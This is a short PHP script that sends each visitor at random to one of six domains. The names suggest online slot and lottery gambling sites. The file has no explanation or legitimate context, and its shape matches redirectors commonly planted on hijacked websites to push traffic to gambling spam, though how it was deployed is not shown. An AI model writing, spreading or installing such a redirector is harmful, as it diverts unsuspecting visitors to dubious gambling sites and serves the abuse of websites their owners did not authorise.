<?php
// Array of URLs to redirect to
$urls = [
    'https://sateslotgacor.xyz',
    'https://megaforwinbet.online',
    'https://nasgorbetseafood.store',
    'https://nagaforwinapi.xyz',
    'https://burungbetsip.fun',
    'https://bimatoto77.xyz',
    // Add more URLs here
];

// Pick a random URL from the array
$random_url = $urls[array_rand($urls)];

// Redirect to the selected URL
header("Location: $random_url");
exit();
?>
